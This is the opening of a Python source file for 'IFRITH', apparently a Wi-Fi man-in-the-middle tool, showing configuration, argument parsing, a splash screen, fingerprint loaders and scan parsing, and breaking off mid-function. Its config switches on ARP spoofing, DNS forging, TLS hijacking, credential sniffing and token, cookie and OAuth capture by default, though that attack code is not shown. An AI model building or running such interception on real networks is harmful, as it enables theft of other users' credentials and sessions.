#!/usr/bin/env python3
import os, sys, re, time, signal, socket, struct, sqlite3, traceback
import hashlib, math, threading, ipaddress, atexit, argparse, json, shutil
import subprocess, queue, select, random, hmac, base64, binascii, ssl
import gzip, zlib, tempfile, urllib.parse, functools, importlib.util
from datetime import datetime, timedelta
from collections import deque, defaultdict, Counter, OrderedDict
from subprocess import check_output, DEVNULL, Popen, PIPE

TOOL_NAME   = "IFRITH"
TOOL_TITLE  = "NETWORK MONITOR AND SITE ATTRIBUTION ENGINE"
TOOL_AUTHOR = "SYLHETYHACKVENGER (THE-ERROR808)"

ASCII_ART = r"""
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⢡⡀⢀⣠⣤⠤⠷⠤⣤⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⣄⠀⠀⣀⡴⠟⠉⢠⡀⠠⢤⣄⣠⠀⠉⠻⢦⡀⠀⢀⡴⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠄⠀⠀⠈⢳⡞⠉⠀⠀⠀⣠⡇⢀⠄⠀⢷⡀⠀⠀⠀⠘⣶⡋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣰⡟⠉⠒⠦⣄⣠⡏⠀⠀⠀⠀⢰⣿⢀⣴⣶⣦⡄⣻⠄⢀⢀⣠⣤⢧⣄⣠⠤⠒⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣶⣶⣿⡋⠀⠀⠀⠀⠀⡟⠀⠀⢠⣠⠀⠀⠹⣿⣿⣿⣿⣿⠋⠀⠈⡍⠀⠀⠈⣿⠀⠀⠀⠀⠒⢦⠀⠐⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⡏⠀⠀⠀⣀⣀⣸⠁⠀⠀⣆⠙⣿⣆⢠⣿⣷⣿⣿⣷⠀⣠⣾⣷⡞⠀⠀⢹⣀⣀⣀⣀⠀⢸⣷⣧⣤⣀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠸⡄⠀⢀⡘⢦⣿⣿⣿⣿⣿⣿⣿⣿⣶⣿⣿⣩⠇⡀⠀⢸⠀⠀⠀⠀⠉⢸⣿⣿⣿⣮⡁⡀⠀⠀⠀⠀
⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⢄⡀⠀⠀⠀⢀⣷⡸⣄⣙⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣖⡚⠁⢀⣞⡀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⡴⣔⠀⠀⠀
⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠐⠺⡏⣍⣁⠀⣽⣿⣿⣿⣿⣿⣿⣽⣿⣯⣽⣿⣿⣿⣍⢁⡜⠉⠉⠓⢤⣄⣾⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀
⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠠⣷⣿⣗⡤⠈⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠻⠛⢤⡀⠀⠀⣨⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀
⠀⣿⣿⣿⣿⣿⠿⢿⣿⣿⠿⢿⣿⣿⣿⣿⣷⡀⠈⣿⣿⣄⠀⣿⣿⣿⠁⠹⣿⣿⣿⣿⣿⢿⣿⣗⠀⠀⠀⠉⠂⣠⣿⣿⡿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀
⢀⡿⡿⠉⣿⡟⠀⢸⣿⠏⠀⠀⢹⠿⠿⢿⣿⣷⣄⠚⢿⣿⣿⣿⡿⠃⢈⣹⣿⣿⣿⣿⣿⡎⢿⣿⣇⠀⠀⣶⣴⣿⣿⣿⣿⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄
⢸⣿⣿⣾⣿⡇⠀⢸⠋⠀⠀⠀⠸⠀⠀⠀⠉⠛⣿⣷⣟⣙⠿⣿⡁⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⡿⢿⣿⠟⢿⡏⠀⢸⠉⠁⠀⠈⢹⢿⣿⣿⣿⡇
⢸⣿⣿⣿⣿⡇⠀⠾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⠍⠛⢿⠷⣶⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢿⣿⣆⠀⠁⠀⠀⠀⠀⠈⠀⠀⠀⠀⠞⠀⠘⣿⣿⣟
⢸⣿⣿⣏⣿⡗⠀⠀⠀⠀⠀⠀⣠⠒⠊⠉⠉⠉⢉⣒⠦⣄⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⣤⣿⣿⠿⠶⠶⢤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇
⠘⣿⣷⣿⡝⠁⠀⠀⠀⠀⠀⠉⢁⠀⠀⠀⠀⠀⠀⠈⢹⣮⣿⣿⣟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠙⠀⠀⠀⠀⠀⠀⠈⠛⢆⠀⠀⠀⠀⠀⠀⠀⠋⢻⡇
⠀⠻⣿⣤⠁⠀⠀⠀⠀⠀⣤⠈⠋⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⡄⠀⠀⠀⠀⠀⢠⡿⠁
⠀⠀⢻⣧⡀⠀⠀⠀⠀⠀⢸⡀⠀⠀⠀⠀⠀⠀⢀⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡀⠀⠀⠀⠀⣼⠃⠀
⠀⠀⠈⢿⡄⠀⠀⠀⠀⠀⠙⣧⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣧⠀⠀⣀⡼⠁⠀⠀
⠀⠀⠀⠀⠙⢶⡀⠀⠀⠀⠀⢿⣷⠀⠀⢀⣠⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠓⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⡟⠀⠀⠛⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠉⠀⠀⠀⠙⠏⠉⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⢿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⣿⣿⣿⣟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡼⠃⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⣷⣀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣞⣿⣿⣿⣿⣿⣿⣿⣼⣿⣿⣿⡿⣾⢻⣿⣿⡟⢻⣿⣿⣿⣿⣿⣿⠙⠳⢤⣀⣀⣀⣠⡤⠖⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢨⣿⣿⣿⣿⣿⣿⣿⠇⣿⣿⣿⣿⢳⣿⣿⣿⣿⡇⣾⣿⣿⣿⣿⣿⠹⠄⠀⠀⠀⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣟⣿⣿⣿⣿⣻⣿⣾⣿⣿⢸⣿⣿⣿⣿⡇⣿⣿⣿⢹⣿⣿⣇⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣾⣅⡿⣫⠟⣿⣿⡿⢹⡿⠿⣿⣿⣧⢸⣿⣿⣿⣿⠇⣿⣿⠇⡞⣿⡏⠉⢷⠴⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣸⡿⠿⠟⠁⠀⡇⢸⡇⢀⣧⡤⢰⣿⡟⢸⡇⡏⢹⣿⠀⣿⡟⠀⢳⣿⡇⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠞⠁⠀⠀⡠⠀⠀⠁⣿⠃⢸⣿⠙⢺⣻⡗⠸⡇⠡⢸⣿⣰⠈⠀⠀⢘⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠉⢸⠁⠀⠀⠀⣿⠀⠘⣿⡄⠀⠁⠁⠀⠃⠀⠈⣿⠿⠀⠀⠀⠘⠀⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠙⡇⠀⠀⠀⠀⠀⠀⢀⣏⣥⠀⠀⠀⢠⣤⠔⠀⠦⠤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡙⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"""

def _need(mod, pkg=None):
    try: __import__(mod)
    except ImportError:
        print(f"[!] IFRITH needs '{mod}'. Install: pip install {pkg or mod}")
        sys.exit(1)

_need("dpkt"); _need("rich")
import dpkt
from rich.console import Console
from rich.table import Table
from rich.live import Live
from rich.panel import Panel
from rich.layout import Layout
from rich.prompt import Confirm, Prompt
from rich.text import Text
from rich.align import Align

_NO_COLOR_FLAG = "--no-color" in sys.argv
console = Console(no_color=_NO_COLOR_FLAG)

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
OUTPUT_DIR = os.path.join(SCRIPT_DIR, "ifrith_output")
try: os.makedirs(OUTPUT_DIR, exist_ok=True)
except Exception: OUTPUT_DIR = "/data/local/tmp"

DATA_DIR = SCRIPT_DIR

CONFIG = {
    "iface": "wlan0",
    "my_ip": None, "my_mac": None,
    "gateway_ip": None, "gateway_mac": None,
    "ssid": None, "bssid": None, "channel": None,
    "signal": None, "encryption": None,
    "netmask": 24,
    "monitor_mode": False,

    "db_file": os.path.join(OUTPUT_DIR, "ifrith.db"),
    "save_pcap": os.path.join(OUTPUT_DIR, "ifrith_capture.pcap"),
    "pcap_rotate_mb": 100,
    "ring_size": 50000,

    "activity_window_s": 30, "sticky_activity_s": 8,
    "hide_ipv6": False,

    "mitm_enabled": True,
    "mitm_mode": "C",
    "mitm_burst_interval_s": 0.4,
    "mitm_burst_duration_s": 10.0,
    "mitm_steady_interval_s": 2.0,
    "mitm_rescan_s": 17.0,
    "mitm_stale_after_s": 3.0,
    "mitm_jitter": True,
    "mitm_ipv6_enabled": True,
    "mitm_quic_block": True,
    "mitm_doh_block": True,

    "proxy_http_port": 8880,
    "proxy_https_port": 8443,
    "proxy_original_port_http": 80,
    "proxy_original_port_https": 443,
    "proxy_nat_http": True,
    "proxy_nat_https": True,
    "proxy_upstream_timeout_s": 30.0,
    "proxy_buffer_size": 65536,
    "proxy_allow_passthrough": True,
    "proxy_max_flows": 4096,

    "kalman_arp_enabled": True,
    "ndp_enabled": True, "ra_enabled": True,
    "dhcpv4_enabled": True, "dhcpv6_enabled": True,
    "dns_forge_enabled": True,
    "portal_enabled": True,
    "search_hijack_enabled": True,
    "smb_msg_enabled": True,
    "mdns_rename_enabled": True,
    "guard_detect_enabled": True,
    "tls_hijack_enabled": True,
    "tcp_fork_enabled": True,
    "h2_hpack_enabled": True,
    "ws_splice_enabled": True,
    "ech_downgrade_enabled": True,
    "quic_downgrade_enabled": True,
    "ct_ranker_enabled": True,
    "baseline_enabled": True,
    "modules_enabled": True,
    "control_sock_enabled": True,
    "nud_pin_enabled": True,
    "sni_defrag_enabled": True,
    "record_align_enabled": True,
    "isn_preserve_enabled": True,
    "ttl_mirror_enabled": True,
    "http_replay_enabled": True,
    "http_body_capture_enabled": True,
    "cred_sniff_enabled": True,
    "token_harvest_enabled": True,
    "captive_hijack_enabled": True,
    "search_spoof_enabled": True,
    "cross_device_enabled": True,
    "tls_terminate_enabled": True,
    "cookie_jar_enabled": True,
    "jwt_decode_enabled": True,
    "oauth_capture_enabled": True,
    "csrf_extract_enabled": True,
    "form_parse_enabled": True,
    "proto_creds_enabled": True,
    "flow_shaper_enabled": True,
    "ttl_manip_enabled": True,
    "nat_hijack_enabled": True,
    "cross_app_corr_enabled": True,
    "behavioral_timing_enabled": True,
    "refresh_token_enabled": True,
    "psk_binder_enabled": True,
    "ws_ctrl_enabled": True,
    "ech_outer_enabled": True,
    "tls_drift_enabled": True,
    "quic_connid_enabled": True,
    "h2_push_enabled": True,
    "quic_retry_enabled": True,
    "probe_fp_enabled": True,
    "bssid_trace_enabled": True,
    "wifidirect_lookup_enabled": True,
    "router_fp_enabled": True,
    "rule_engine_enabled": True,
    "policy_mgr_enabled": True,
    "kernel_snap_enabled": True,
    "signed_log_enabled": True,
    "sql_state_enabled": True,
    "live_mirror_enabled": True,
    "ja4s_fidelity_enabled": True,
    "cookie_graph_enabled": True,
    "pcap_rotate_enabled": True,
    "userspace_forwarder_enabled": True,
    "auto_invoke_primitives_enabled": True,
    "ct_log_query_enabled": True,
    "module_sig_verify_enabled": True,
    "dnsbl_enabled": True,

    "sni_enabled": True, "ja3_enabled": True,
    "ja4_enabled": True, "ja4_verbose": True,
    "debug": False,
    "connect_timeout_s": 45, "connect_poll_interval_s": 1.0,
    "dns_dup_window_s": 3.0, "per_device_sites_max": 150,
    "per_device_ja3_max": 20, "dns_events_maxlen": 6000,
    "ja4_events_maxlen": 4000, "ja3_events_maxlen": 4000,
    "app_vote_decay_s": 180, "app_min_confidence": 2,
    "app_display_top_n": 2,

    "ja4_tshark_path": None,
    "tshark_enabled": True,

    "auto_ca_dir": os.path.join(OUTPUT_DIR, "ca"),
    "portal_port": 8890,
    "portal_host": "0.0.0.0",
    "tls_bridge_timeout_s": 30.0,
    "control_socket": os.path.join(OUTPUT_DIR, "ifrith.sock"),
    "control_hmac_key": os.path.join(OUTPUT_DIR, "ifrith.hmac"),
    "modules_dir": os.path.join(OUTPUT_DIR, "modules"),
    "modules_pubkey": os.path.join(OUTPUT_DIR, "modules.pub"),
    "signed_log": os.path.join(OUTPUT_DIR, "ifrith_log.jsonl"),
    "mirror_socket": os.path.join(OUTPUT_DIR, "ifrith_mirror.sock"),
    "kernel_snapshot": os.path.join(OUTPUT_DIR, "kernel_snapshot.json"),
    "policies_file": os.path.join(OUTPUT_DIR, "policies.json"),
    "rules_file": os.path.join(OUTPUT_DIR, "rules.json"),

    "oui_file": os.path.join(DATA_DIR, "master_oui.txt"),
    "dhcp_fp_file": os.path.join(DATA_DIR, "dhcp_fingerprints.conf"),
    "ja3_db_file": os.path.join(DATA_DIR, "ja3_database.csv"),
    "ua_db_file": os.path.join(DATA_DIR, "user-agents.json"),
    "dnsbl_whitelist_file": os.path.join(DATA_DIR, "dnsbl_whitelist.txt"),

    "ct_log_endpoint": "https://crt.sh/?q={sni}&output=json",
    "forward_queue_max": 4096,
    "ui_refresh_hz": 2.0,
    "panel_cache_ttl_s": 1.0,
}

def _parse_args():
    p = argparse.ArgumentParser(prog="ifrith", description="IFRITH")
    p.add_argument("-i", "--iface", default="wlan0")
    p.add_argument("-g", "--gateway")
    p.add_argument("-s", "--scan-only", action="store_true")
    p.add_argument("--no-color", action="store_true")
    p.add_argument("--debug", action="store_true")
    p.add_argument("--no-ja4", action="store_true")
    p.add_argument("--no-tshark", action="store_true")
    p.add_argument("--no-mitm", action="store_true")
    p.add_argument("--no-proxy", action="store_true")
    p.add_argument("--no-tls-term", action="store_true")
    p.add_argument("--mitm-mode", choices=["A","B","C","N"], default=None)
    p.add_argument("--no-splash", action="store_true")
    p.add_argument("--sql", help="Run SQL over live state and exit")
    return p.parse_args()

def sh(cmd, timeout=15):
    try:
        return check_output(cmd, shell=True, stderr=DEVNULL, timeout=timeout)\
            .decode(errors="ignore").strip()
    except Exception: return ""

def pretty_bytes(n):
    try: n = float(n)
    except Exception: return "0B"
    for unit in ("B", "KB", "MB", "GB"):
        if n < 1024: return f"{n:.1f}{unit}"
        n /= 1024
    return f"{n:.1f}TB"

def _term_width():
    try: return console.size.width
    except Exception: return 80

def _term_height():
    try: return console.size.height
    except Exception: return 40

def _safe_load_lines(path, strip=True):
    try:
        if not path or not os.path.exists(path): return []
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            return [ (l.strip() if strip else l.rstrip("\r\n"))
                     for l in f if l.strip() ]
    except Exception: return []

class _Splash:
    FRAMES = ("◐","◓","◑","◒")
    SWEEP = ("▁","▂","▃","▄","▅","▆","▇","█","▇","▆","▅","▄","▃","▂")
    BANNER = (
        "  ██╗███████╗██████╗ ██╗████████╗██╗  ██╗  ",
        "  ██║██╔════╝██╔══██╗██║╚══██╔══╝██║  ██║  ",
        "  ██║█████╗  ██████╔╝██║   ██║   ███████║  ",
        "  ██║██╔══╝  ██╔══██╗██║   ██║   ██╔══██║  ",
        "  ██║██║     ██║  ██║██║   ██║   ██║  ██║  ",
        "  ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝   ╚═╝   ╚═╝  ╚═╝  ",
    )
    ROTATING = (
        "INITIALIZING IFRITH CORE",
        "CALIBRATING SENSOR ARRAY",
        "MOUNTING PACKET PIPELINE",
        "SYNCING FINGERPRINT DATABASE",
        "ARMING DNSBL MATRIX",
        "LOADING OUI / DHCP / JA3 / UA",
        "SPINNING UP JA4+ ENGINES",
        "BINDING KERNEL HOOKS",
        "READY",
    )
    def __init__(self):
        self._running = False
        self._thread = None
        self._lock = threading.RLock()
        self._status = "BOOTING IFRITH"
        self._alt = False
        self._t0 = time.time()
    def _setup_term(self):
        try:
            if not sys.stdout.isatty(): return False
            sys.stdout.write("\033[?1049h\033[?25l\033[2J")
            sys.stdout.flush()
            return True
        except Exception: return False
    def _restore_term(self):
        try:
            sys.stdout.write("\033[?25h\033[0m\033[2J")
            if self._alt: sys.stdout.write("\033[?1049l")
            sys.stdout.flush()
        except Exception: pass
    def _render(self):
        try:
            w = shutil.get_terminal_size((80, 24)).columns
        except Exception: w = 80
        t = time.time() - self._t0
        spinner = self.FRAMES[int(t * 12) % len(self.FRAMES)]
        sweep_i = int(t * 12) % len(self.SWEEP)
        sweep = "".join(
            ("█" if (i + sweep_i) % len(self.SWEEP) < 3 else "▁")
            for i in range(max(20, w - 6)))
        with self._lock: status = self._status
        rot = self.ROTATING[int(t * 1.5) % len(self.ROTATING)]
        out = []
        out.append("\033[2J\033[H")
        out.append("\n")
        for line in self.BANNER:
            out.append("\033[38;5;196m" + line.center(w) + "\033[0m\n")
        out.append("\033[38;5;240m" + f"{TOOL_TITLE}".center(w) + "\033[0m\n")
        out.append("\033[38;5;240m" + f"by {TOOL_AUTHOR}".center(w) + "\033[0m\n")
        out.append("\n")
        out.append("\033[38;5;51m" + sweep.center(w) + "\033[0m\n")
        out.append("\n")
        dot = "\033[38;5;196m●\033[0m"
        line = f"  {dot}  {spinner}  {status}"
        out.append(line.center(w + 8) + "\n")
        out.append("\033[38;5;244m" + f"[ {rot} ]".center(w) + "\033[0m\n")
        out.append("\n")
        ticks = int((t * 20) % 40)
        bar = "▰" * ticks + "▱" * (40 - ticks)
        out.append("\033[38;5;208m" + bar.center(w) + "\033[0m\n")
        out.append("\n")
        out.append("\033[38;5;240m" + "PLEASE WAIT · SYSTEM IS LOADING".center(w) + "\033[0m\n")
        try:
            sys.stdout.write("".join(out)); sys.stdout.flush()
        except Exception: pass
    def _loop(self):
        while self._running:
            self._render()
            time.sleep(1.0 / 12.0)
    def start(self):
        with self._lock:
            if self._running: return
            self._alt = self._setup_term()
            self._running = True
            self._t0 = time.time()
            self._thread = threading.Thread(target=self._loop, daemon=True)
            self._thread.start()
    def set_status(self, s):
        with self._lock: self._status = str(s)[:60]
    def stop(self):
        with self._lock:
            if not self._running: return
            self._running = False
        try:
            if self._thread: self._thread.join(timeout=0.5)
        except Exception: pass
        self._restore_term()

_SPLASH = _Splash()
atexit.register(_SPLASH.stop)

_OUI_VENDORS = {}
def _load_oui():
    global _OUI_VENDORS
    if _OUI_VENDORS: return
    for line in _safe_load_lines(CONFIG.get("oui_file")):
        try:
            if "|" in line:
                parts = line.split("|")
                if len(parts) >= 2:
                    pre = parts[0].strip().upper().replace(":", "").replace("-", "")
                    ven = parts[1].strip()
                    if len(pre) >= 6:
                        _OUI_VENDORS[pre[:6]] = ven
                    continue
            if "," in line:
                parts = line.split(",", 1)
                pre = parts[0].strip().upper().replace(":", "").replace("-", "")
                ven = parts[1].strip().strip('"')
                if len(pre) >= 6:
                    _OUI_VENDORS[pre[:6]] = ven
                continue
            m = re.match(r"^([0-9A-Fa-f:\-]{8,17})\s+(.+)$", line)
            if m:
                pre = re.sub(r"[^0-9A-Fa-f]", "", m.group(1)).upper()[:6]
                ven = m.group(2).strip()
                if len(pre) == 6:
                    _OUI_VENDORS[pre] = ven
        except Exception: pass

_DHCP_FP = {}
def _load_dhcp_fp():
    global _DHCP_FP
    if _DHCP_FP: return
    for line in _safe_load_lines(CONFIG.get("dhcp_fp_file")):
        try:
            if "=" not in line: continue
            k, v = line.split("=", 1)
            k = k.strip().strip('"'); v = v.strip().strip('"')
            if not k: continue
            _DHCP_FP[k] = v
        except Exception: pass

_JA3_DB = {}
def _load_ja3_db():
    global _JA3_DB
    if _JA3_DB: return
    for line in _safe_load_lines(CONFIG.get("ja3_db_file")):
        try:
            if line.startswith("#"): continue
            parts = [p.strip().strip('"') for p in line.split(",")]
            if len(parts) < 2: continue
            h = parts[0].lower()
            if not re.match(r"^[0-9a-f]{32}$", h): continue
            label = parts[1] if len(parts) > 1 else ""
            cat = parts[2] if len(parts) > 2 else ""
            _JA3_DB[h] = (label, cat)
        except Exception: pass

_UA_DB = {"browsers": [], "bots": []}
def _load_ua_db():
    global _UA_DB
    if _UA_DB["browsers"]: return
    try:
        with open(CONFIG.get("ua_db_file"), "r", encoding="utf-8") as f:
            data = json.load(f)
        if isinstance(data, list):
            for ua in data:
                if isinstance(ua, str):
                    _UA_DB["browsers"].append(ua)
        elif isinstance(data, dict):
            for k in ("browsers", "user_agents", "agents"):
                if k in data and isinstance(data[k], list):
                    _UA_DB["browsers"].extend([str(x) for x in data[k]])
    except Exception: pass
    _UA_DB["bots"] = [
        "curl/", "wget/", "python-requests/", "python-urllib/", "python/",
        "go-http-client/", "java/", "libwww-perl", "okhttp/", "axios/",
        "node-fetch/", "apache-httpclient", "scrapy/", "postmanruntime/",
        "insomnia/", "httpie/", "powershell/",
        "facebookexternalhit/", "twitterbot/", "slackbot", "discordbot/",
        "telegrambot", "semrushbot", "ahrefsbot", "yandexbot",
    ]

_DNSBL = set()
_DNSBL_ORDER = []
def _load_dnsbl():
    global _DNSBL, _DNSBL_ORDER
    if _DNSBL: return
    for line in _safe_load_lines(CONFIG.get("dnsbl_whitelist_file")):
        if line.startswith("#"): continue
        d = line.strip().lower().rstrip(".")
        if not d: continue
        if d not in _DNSBL:
            _DNSBL.add(d)
            _DNSBL_ORDER.append(d)

def _dnsbl_match(name):
    if not name or not _DNSBL: return None
    n = name.lower().rstrip(".")
    parts = n.split(".")
    for i in range(len(parts)):
        cand = ".".join(parts[i:])
        if cand in _DNSBL: return cand
    return None

def lookup_vendor(mac):
    if not mac or mac == "?": return "?"
    try:
        key = re.sub(r"[^0-9A-Fa-f]", "", mac).upper()
        if len(key) < 6: return "?"
        return _OUI_VENDORS.get(key[:6], "?")
    except Exception: return "?"

def _dhcp_vendor_from_options(opts):
    if not opts: return None
    try:
        v = _DHCP_FP.get(opts) or _DHCP_FP.get(opts.replace(" ", ""))
        if v: return v
        if opts in _DHCP_FP: return _DHCP_FP[opts]
        for k, lab in _DHCP_FP.items():
            if k and k in opts: return lab
    except Exception: pass
    return None

def _ua_is_browser(ua):
    if not ua: return False
    low = ua.lower()
    for b in _UA_DB["bots"]:
        if b in low: return False
    for real in _UA_DB["browsers"]:
        if low == real.lower(): return True
    if "mozilla/" in low and ("chrome/" in low or "firefox/" in low
                              or "safari/" in low or "edg/" in low):
        return True
    return False

def _ua_is_bot(ua):
    if not ua: return False
    low = ua.lower()
    return any(b in low for b in _UA_DB["bots"])

AP_HEADER_RE = re.compile(
    r"^BSS\s+([0-9a-fA-F]{2}(?::[0-9a-fA-F]{2}){5})(?:\(on\s+\S+\))?", re.MULTILINE)
MAC_RE = re.compile(r"^[0-9a-f]{2}(:[0-9a-f]{2}){5}$", re.I)

def _channel_from_freq(f):
    try: f = float(f)
    except Exception: return None
    if f > 1e7: f = f / 1e6
    if f == 2484: return 14
    if f < 2484: return int((f - 2407) // 5)
    if f < 5000: return None
    if f < 5895: return int((f - 5000) // 5)
    return int((f - 5950) // 5) + 1

def _debug_dump(tool, output):
    if not CONFIG.get("debug"): return
    console.print(Panel((output or "(empty)")[:2000],
                 title=f"[yellow]DEBUG — {tool}[/]", border_style="yellow"))

def _parse_channel_from_block(block, lines):
    m = re.search(r"DS Parameter set:\s*channel\s*(\d+)", block)
    if m:
        try: return int(m.group(1))
        except Exception: pass
    for ln in lines:
        s = ln.strip()
        if s.startswith("freq:"):
            try:
                f = s.split(":", 1)[1].strip().split()[0]
                ch = _channel_from_freq(f)
                if ch: return ch
            except Exception: pass
    m = re.search(r"primary channel:\s*(\d+)", block)
    if m:
        try: return int(m.group(1))
        except Exception: pass
    return None

def _run_iw_scan(iface):
    out = sh(f"iw dev {iface} scan 2>&1", timeout=25)
    _debug_dump(f"iw dev {iface} scan", out)
    if not out or "Operation not permitted" in out or "not supported" in out:
        return []
    headers = [(m.start(), m.group(1).lower()) for m in AP_HEADER_RE.finditer(out)]
    aps = []
    for i, (off, bssid) in enumerate(headers):
        end = headers[i + 1][0] if i + 1 < len(headers) else len(out)
        block = out[off:end]; lines = block.splitlines()
        ssid = None; signal = None; enc = "OPEN"
        has_rsn = "RSN:" in block; has_wpa = "WPA:" in block
        has_privacy = False; pmf = "no"
        for ln in lines[1:]:
            s = ln.strip()
            if s.startswith("SSID:"): ssid = s[5:].strip()
            elif s.startswith("signal:"):
                try: signal = float(s.split(":", 1)[1].split()[0])
                except (ValueError, IndexError): pass
            elif s.startswith("capability:") and "Privacy" in s:
                has_privacy = True
        if "MFP-required" in block: pmf = "required"
        elif "MFP-capable" in block: pmf = "capable"
        channel = _parse_channel_from_block(block, lines)
        if has_rsn and "SAE" in block: enc = "WPA3"
        elif has_rsn and has_wpa: enc = "WPA/WPA2"
        elif has_rsn: enc = "WPA2"
        elif has_wpa: enc = "WPA"
        elif has_privacy: enc = "WEP/encrypted"
        if MAC_RE.match(bssid):
            aps.append({"bssid": bssid, "ssid": ssid if ssid else "<hidden>",
                        "channel": channel, "signal": signal,
                        "encryption": enc, "pmf": pmf})
    return aps

def _run_iwlist_scan(iface):
    if not sh("which iwlist"): return []
    out = sh(f"iwlist {iface} scan 2>&1", timeout=25)
    if not out or "interface doesn't support scanning" in out.lower(): return []
    aps = []
    for block in re.split(r"Cell \d+ - Address:", out)[1:]:
        bssid = block.strip().split("\n", 1)[0].strip().lower()
        if not MAC_RE.match(bssid): continue
